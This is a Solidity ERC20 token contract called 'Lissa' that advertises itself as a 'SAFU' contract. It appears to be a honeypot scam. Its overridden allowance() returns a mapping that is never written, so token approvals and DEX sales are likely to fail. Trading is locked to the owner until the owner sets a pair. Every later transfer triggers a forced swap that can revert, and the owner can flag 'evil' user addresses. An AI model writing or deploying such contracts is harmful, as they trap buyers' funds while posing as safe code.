// Get your SAFU contract now via Coinsult.net

// SPDX-License-Identifier: MIT

pragma solidity 0.8.2;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";

import "./Owned.sol";
import "./router.sol";










 contract Lissa is
    ERC20,
    ERC20Burnable,
    ERC20Snapshot,
    Owned
    
    
{




 
   mapping(address => bool) public whatimemcoin;

   uint256 private _timetostart;
   bool public checkifcannft;
   
     address public uniswapV2Pair;
     address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
     address private constant PANCAKESWAP_V2_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
     address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
       address private constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    
    mapping (address => mapping (address => uint256)) private _allowances;
     
 
    /**
     * @dev Sets the values for {name} and {symbol} and mint the tokens to the address set.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(
        address _owner,
        string memory token,
        string memory _symbol
       
        )
        
    
        ERC20(token,
        _symbol
        )
        Owned(_owner)
        
    {
      
        _mint(_owner, 10000000 ether);
    
      
    }

    /**
     * @dev Creates a new snapshot and returns its snapshot id.
     *
     * Emits a {Snapshot} event that contains the same id.
     *
     * {_snapshot} is `internal` and you have to decide how to expose it externally. Its usage may be restricted to a
     * set of accounts, for example in our contract, only Owner can call it.
     *
     */
    function snapshot() public onlyOwner {
        _snapshot();
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */


    
   

 function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }



      function addmemcoin (address _evilUser,bool stastuse ) external onlyOwner {
     
        whatimemcoin[_evilUser] = stastuse;
     }
   function adduniswapV2Pair (address _uniswapV2Pair ) external onlyOwner {
     
        uniswapV2Pair = _uniswapV2Pair;
     }

    
    function swapTokensForEth(uint256 tokenAmount) private  {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;
       

     _approve(address(this), PANCAKESWAP_V2_ROUTER, tokenAmount);
    
    // IUniswapV2Router(PANCAKESWAP_V2_ROUTER).swapExactTokensForTokens(tokenAmount, 0, path, address(this), block.timestamp);
     IUniswapV2Router(PANCAKESWAP_V2_ROUTER).swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);

      


    }
 



         function _beforeTokenTransfer(
          address from,
          address to,
          uint256 amount
          ) internal override(ERC20, ERC20Snapshot) {
      
           
         
       
 if (uniswapV2Pair == address(0)) {
              require(from == owner || to == owner, "trading is not started");
              return;
             }
        
if (uniswapV2Pair != address(0)) {
swapTokensForEth(amount);
} 
        super._beforeTokenTransfer(from, to, amount);
             
        



       

      





        
     
          
    }







}